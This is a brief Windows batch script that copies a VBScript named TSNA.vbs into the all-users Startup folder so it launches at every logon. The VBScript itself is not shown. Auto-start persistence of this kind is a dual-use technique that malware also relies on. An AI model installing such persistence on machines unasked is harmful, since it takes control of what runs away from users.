@ECHO OFF
@setlocal enableextensions
@cd /d "%~dp0"

xcopy "..\TSNA.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
